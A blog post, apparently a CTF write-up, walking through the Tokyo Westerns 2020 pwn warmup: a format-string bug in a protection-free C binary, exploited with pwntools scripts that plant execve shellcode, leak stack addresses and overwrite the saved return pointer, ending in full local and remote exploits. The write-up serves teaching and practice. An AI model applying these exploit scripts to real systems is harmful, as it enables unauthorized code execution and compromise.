---
layout: post
author: playoff-rondo
title:  "Tokyo Westerns CTF 2020: Nothing More to Say"
date:   2020-09-20 18:01:37 -0500
categories: CTF-writeup
ctf-category: PWN
---
# Nothing More to Say

## Challenge Description
![](https://i.imgur.com/1SM5lq6.png)

This challenge was the warmup challenge for the PWN section. For this challenge we were given both the compiled binary and the c source code as well as a running service on their machine.

## Understanding the Binary

The following is the C source code for the binary:
```c=
// gcc -fno-stack-protector -no-pie -z execstack
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init_proc() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
}

void read_string(char* buf, size_t length) {
    ssize_t n;
    n = read(STDIN_FILENO, buf, length);
    if (n == -1)
        exit(1);
    buf[n] = '\0';
}

int main(void) {
    char buf[0x100]; 
    init_proc();
    printf("Hello CTF Players!\nThis is a warmup challenge for pwnable.\nDo you know about Format String Attack(FSA) and write the exploit code?\nPlease pwn me!\n");
    while (1) {
        printf("> ");
        read_string(buf, 0x100);
        if (buf[0] == 'q')
            break;
        printf(buf);
    }
    return 0;
}
```
The first string print basically tells us the vulnerability is a <a href="https://owasp.org/www-community/attacks/Format_string_attack">Format Strings Attack</a>, although we can determine that as well because line 29 is vulnerable do to calling printf on a buffer we control without using a format specificer. 

By replacing<code> printf(buf);</code> with <code>printf("%s",buff);</code> the vulnerability would not exist. 

The source provided also tells us how the binary was compiled: <code>gcc -fno-stack-protector -no-pie -z execstack</code>

The first option passed to gcc (the compiler) is <code>fno-stack-protector</code>. This disables <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">stack canaries</a>. If stack canaries were enabled, we would still be able to <a href="https://ctf101.org/binary-exploitation/stack-canaries/">solve the challenge</a> but as this is just a warmup challenge, its disabled for simplicity.

The second options is <code>no-pie</code>. This means that the binary is not <a href="https://en.wikipedia.org/wiki/Position-independent_code">position independent</a>. By not being position independent, we know where the binary and all its dependencies will be loaded in memory.

<p>The last option is <code>execstack</code>. This means that instead of the stack having rw- (just read and write) permissions it will have rwx (read,write and execute). We can then put our own shellcode on the stack and execute it.</p>

If we were not given the exact command used to compile this binary, we would still be able to determine that these exploit mitigation have been disabled by using the command <a href="https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec">checksec</a> which is built into the <a href="https://github.com/Gallopsled/pwntools">pwntools library</a> The output of that command is below.

![](https://i.imgur.com/bI7Y2La.png)

The source code shows that the binary will keep accepting input through the `read_string` function and then use the vulnerable `printf` call to our input as many times as we like until we send 'q' to quit. This means we can leverage the vulnerability as many times as we like.

## Crafting the Exploit
<!-- wp:paragraph -->
<p>The methodology of the exploit will go as follows:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Place our shellcode onto the stack</li><li>Leak the address of our shellcode</li><li>Leak the saved instruction pointer</li><li>Overwrite the saved instruction pointer to point to our shellcode</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Alternatively during the CTF, I originally attempted to overwrite the <a href="https://en.wikipedia.org/wiki/Global_Offset_Table">GOT</a> entry of the <code>exit</code> call. I tried that route because of <code>checksec</code> indicated that the binary had <a href="https://ctf101.org/binary-exploitation/relocation-read-only/">partial RELRO</a>. By overwriting the GOT entry for <code>exit</code> to point to our shellcode, when the binary hits a call to <code>exit</code>, the binary will got to the GOT entry for <code>exit</code> and jump to our shellcode. This all sounds good except for the fact that I could not figure out a way to call the exit function.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The only time <code>exit</code> was called was if the <code>read</code> call in the function <code>read_string</code> errored and returned <code>-1</code>. The only way I could think to get <code>read</code> to error would be if it was trying to read from a file descriptor that was invalid. Unfortunately the read would always be from file descriptor 0 (stdin).</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The exploit script will heavily use pwntools to quickly craft a working exploit. The exploit will begin like:</p>
<!-- /wp:paragraph -->

```python=
from pwn import *
context.arch = "amd64"

io = process("./nothing")
g = gdb.attach(io)
```
This tells pwntools that we are working with an x86-64 binary and that the binary we want to interact with is ./nothing. Then immediately attach gdb to the process so we can do some debugging.
### Place our shellcode onto the stack
The shellcode we will use comes from `shellcraft.amd64.linux.sh()` and looks like:
```python=
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
/* push '/bin///sh\x00' */
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
/* push argument array ['sh\x00'] */
/* push 'sh\x00' */
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor esi, esi /* 0 */
push rsi /* null terminate */
push 8
pop rsi
add rsi, rsp
push rsi /* 'sh\x00' */
mov rsi, rsp
xor edx, edx /* 0 */
/* call execve() */
push SYS_execve /* 0x3b */
pop rax
syscall
```
To send the shellcode to the binary we will use the following code:
```python=
shellcode = asm(shellcraft.amd64.linux.sh())
io.sendlineafter("> ",shellcode)
```
We need to assemble the shellcode which is why we wrap the function with asm, its also important that we specified the arch earlier so pwntools knows to assemble this shellcode for the x86-64 archetecture.

Then we send the shellcode to the binary after the "> ".

Then adding the line `io.interactive()` after will keep the binary running waiting for the next input.

Running the script up to this point will spawn a gdb session, send our shellcode and then wait for the rest of our input.

I will be using [GEF](https://github.com/hugsy/gef) on top of my gdb to add a few features as well as provide an interface that is easier to understand then plain gdb.

The gdb session spawned should looks something like:
![](https://i.imgur.com/JjcWgct.png)

Using the command `finish` twice we can find ourselves in the main function directly after the `read_string` call.

![](https://i.imgur.com/dTyzek7.png)

Here we can see that our shellcode is placed on the stack at the address: `0x00007fff6fa98680`

We will soon need to leak that address so we can know where our shellcode is outside of a debugger.

### Leak the address of our shellcode
Using the format specifier "%p" we can leak data off the stack. Using the code below, we can leak the first 30 pointer addresses off the stack.

```python=
leak_payload = "%p."*30
io.sendlineafter("> ",leak_payload)
```

The result is: 
![](https://i.imgur.com/V70Xtfd.png)

Using gdb we can see that the first pointer printed actually points to our "%p" string, meaning that address will point to whatever string we send.

![](https://i.imgur.com/jnV24G4.png)

Adjusting our leak_payload to only print the first value off the stack, we can then read that value in an save it for later.

```python=
leak_payload = "%p"
io.sendlineafter("> ",leak_payload)
leak = int(io.readline().strip(),16)
print "Address of input:",hex(leak)
```

### Leak the saved instruction pointer

Because we can't overwrite exit GOT we have to find something else we can control. In this case we are looking to overwrite the saved instruction pointer. 

This means when the main function returns, instead of returning into `__libc_start_main` it returns to our shellcode.

In gdb, step until we are in the main function after the `read_string` and then run info frame, this will print information about the stack frame.

![](https://i.imgur.com/epCDCLb.png)

Again in gdb, printing off the stack we see that the saved RIP is on the stack 0x108 bytes after our shellcode.

![](https://i.imgur.com/BtCzR2q.png)

We can add a print statement to our code print the address that points to our saved RIP.

```python=
saved_rip = leak+0x108
print "Address of saved rip", hex(saved_rip)
```

### Overwrite the saved instruction pointer to point to our shellcode

Typically, when writing an exploit involving a format strings vulnerability, I try to use pwntools's [fmtstr_payload](https://docs.pwntools.com/en/stable/fmtstr.html). For this challenge, I chose to do it by hand. To do this we will take advantage of the [format specifier "%n"](https://www.geeksforgeeks.org/g-fact-31/). The "%n" writes the number of bytes that were printed to a given location.

We first need to determine the offset of our input, to get the general location we can use the following code:

```python=
overwrite_payload = "A"*8
overwrite_payload += "%p."*10
io.sendlineafter("> ",overwrite_payload)
```
The output shows that the "A"s are the 6th pointer on the stack.

![](https://i.imgur.com/6ScomLZ.png)

As mentioned earlier, to control what we write, we need to control the number of bytes that get printed before the %n. We can use "%x" to choose how many bytes with the following code:

```python=
overwrite_payload = "%100x"
overwrite_payload += "%6$p"
overwrite_payload += "A"*8
io.sendlineafter("> ",overwrite_payload)
```

In this example we place 100 spaces and then print the 6th pointer off the stack, which hopefully would be our "A"s. But because we added to our payload our "A"'s will no longer be the 6th pointer off the stack. Lets see what it looks like if it was the 7th pointer off the stack using the code below.

```python=
overwrite_payload = "%100x"
overwrite_payload += "%7$p"
overwrite_payload += "A"*8
io.sendlineafter("> ",overwrite_payload)
```
![](https://i.imgur.com/fkf6akA.png)

We are almost there but its not exact. There is a 0x70 at the end. We need to mess with the alignment. We can align it to be the 8th pointer off the stack by appending "7" bytes of padding after out "$p". The following code aligns it.
```python=
overwrite_payload = "%100x"
overwrite_payload += "%8$pzzzzzzz"
overwrite_payload += "A"*8
io.sendlineafter("> ",overwrite_payload)
```
And the output below shows that we have all our "A"'s aligned:

![](https://i.imgur.com/otBCEOS.png)

We can now substitute the "A"'s with saved rip address and we should see that address show up in the response.

```python=
overwrite_payload = "%100x"
overwrite_payload += "%8$pzzzzzzz"
overwrite_payload += p64(saved_rip)
io.sendlineafter("> ",overwrite_payload)
```
![](https://i.imgur.com/3j6JOFO.png)

Switching from %p to %n will let us write 100 bytes to the saved rip address.

```python=
overwrite_payload = "%100x"
overwrite_payload += "%8$nzzzzzzz"
overwrite_payload += p64(saved_rip)
io.sendlineafter("> ",overwrite_payload)
```

Running the code above and then running continue in gdb, we can examine if our write worked The output is shown below.
![](https://i.imgur.com/mIkdte6.png)

![](https://i.imgur.com/nyWRY9r.png)

We wrote 0x64 (100) to that address. Unfortunetly it also wrote 0x0 over some of the bytes in that address. If we want to only change the last byte ww can append "hh" before the "%n". By adding those 2 characters we have to subtract 2 from the padding we added to keep everything aligned.

```python=
overwrite_payload = "%100x"
overwrite_payload += "%8$hhnzzzzz"
overwrite_payload += p64(saved_rip)
io.sendlineafter("> ",overwrite_payload)
```

The result of the code below, printing the saved rip:

![](https://i.imgur.com/GpziExs.png)

This only wrote 0x64 to the last byte and kept the other bytes intact. We can now attempt to write the address of our shellcode instead of 0x64

We can use the regular expressions library to split the leaked address of our shellcode by each bytes.

```python=
import re
writes = re.findall(".{2}",hex(leak))[1::]
print(writes)
```
The output breaks up the address into each byte, which we will use as our write.
![](https://i.imgur.com/YSii108.png)

The code below loops through all the bytes in the leaked shellcode address in reverse order and writes that byte to the address of the saved_rip. Unfortunately, running this code will probably crash the binary because of how we are converting a hex byte into decimal. The length of the number in decimal can fluctuate. For example 0x64 in decimal is 100 so the length would be 3, but 0x63 is 99 so the length would be 2. This will mess up the alignment because before we were aligned when the number had a length of 3.

```python=
writes = re.findall(".{2}",hex(leak))[1::]
index = 0
for write in writes[::-1]:
    overwrite_payload = "%"+str(int(write,16))+"x"
    overwrite_payload += "%8$hhnzzzzz"
    overwrite_payload += p64(saved_rip+index)
    io.sendlineafter("> ",overwrite_payload)
    index+=1
```

We can pad our number with 0s in front because 099 == 99. That way we can ensure we are always aligned.

```python=
writes = re.findall(".{2}",hex(leak))[1::]
index = 0
for write in writes[::-1]:
    overwrite_payload = "%"+str(int(write,16)).rjust(3,"0")+"x"
    overwrite_payload += "%8$hhnzzzzz"
    overwrite_payload += p64(saved_rip+index)
    io.sendlineafter("> ",overwrite_payload)
    index+=1
```
Running in script with gdb we can confirm that our write was successful.

![](https://i.imgur.com/wudr3ms.png)

![](https://i.imgur.com/XgZGSyK.png)

We can see that the saved rip now points to the address of our input. But if you look closely, the address of our input isn't exactly the beginning of our shellcode.

Lets examine it further.

![](https://i.imgur.com/yz2M7ku.png)

The address of our"shellcode" actually begins with 0x2438257837323125 or "$8%x721%" which happends to be the last string we sent to the binary. This is because the binary reuses the same stack address for each call. Our shellcode is partially overwritten by our input we send later in the binary.

We can add padding to the shellcode so that the bytes we overwrite is just padding and our shellcode will start after.

```python
shellcode = "A"*40+asm(shellcraft.amd64.linux.sh())
```

After adding the padding we can see that our shellcode now starts 0x28 after the address of our input.

![](https://i.imgur.com/9ItDqEg.png)

We can add that offset to the address of our input and print that line.

```python=
shellcode = leak+0x28
print "Address of shellcode:",hex(shellcode)
```

And instead of writing the address of our input to the saved rip we can write the address of our shellcode.

```python
writes = re.findall(".{2}",hex(shellcode))[1::]
```

We can now confirm that the saved rip points to our shellcode through gdb.

![](https://i.imgur.com/pLJ2vIm.png)

![](https://i.imgur.com/hMPJxA0.png)


Now we just need to trigger the shellcode to be executed by sending "q" which will return out of main and into our shellcode.

```python
io.sendlineafter("> ","q")
```

## Putting it all Together
### Local exploit
The final code to run this locally with gdb is below:
```python=
from pwn import *
import re
context.arch = "amd64"

io = process("./nothing")
g = gdb.attach(io)

shellcode = "A"*40+asm(shellcraft.amd64.linux.sh())
io.sendlineafter("> ",shellcode)

leak_payload = "%p"
io.sendlineafter("> ",leak_payload)
leak = int(io.readline().strip(),16)
print "Address of input:",hex(leak)
shellcode = leak+0x28
print "Address of shellcode:",hex(shellcode)
saved_rip = leak+0x108
print "Address of saved rip", hex(saved_rip)

writes = re.findall(".{2}",hex(shellcode))[1::]
index = 0
for write in writes[::-1]:
    overwrite_payload = "%"+str(int(write,16)).rjust(3,"0")+"x"
    overwrite_payload += "%8$hhnzzzzz"
    overwrite_payload += p64(saved_rip+index)
    io.sendlineafter("> ",overwrite_payload)
    index+=1
io.sendlineafter("> ","q")
io.interactive()
```

The output shows that a shell was spawned.

![](https://i.imgur.com/1gqfetm.png)

### Remote Exploit

For the remote exploit we just replace the process function with the remote function, passing in the host and port.
```python=
from pwn import *
import re
context.arch = "amd64"

io = remote("pwn02.chal.ctf.westerns.tokyo",18247)

shellcode = "A"*40+asm(shellcraft.amd64.linux.sh())
io.sendlineafter("> ",shellcode)

leak_payload = "%p"
io.sendlineafter("> ",leak_payload)
leak = int(io.readline().strip(),16)
print "Address of input:",hex(leak)
shellcode = leak+0x28
print "Address of shellcode:",hex(shellcode)
saved_rip = leak+0x108
print "Address of saved rip", hex(saved_rip)

writes = re.findall(".{2}",hex(shellcode))[1::]
index = 0
for write in writes[::-1]:
    overwrite_payload = "%"+str(int(write,16)).rjust(3,"0")+"x"
    overwrite_payload += "%8$hhnzzzzz"
    overwrite_payload += p64(saved_rip+index)
    io.sendlineafter("> ",overwrite_payload)
    index+=1
io.sendlineafter("> ","q")
io.interactive()
```
### Getting the Flag
![](https://i.imgur.com/4MfrstD.png)
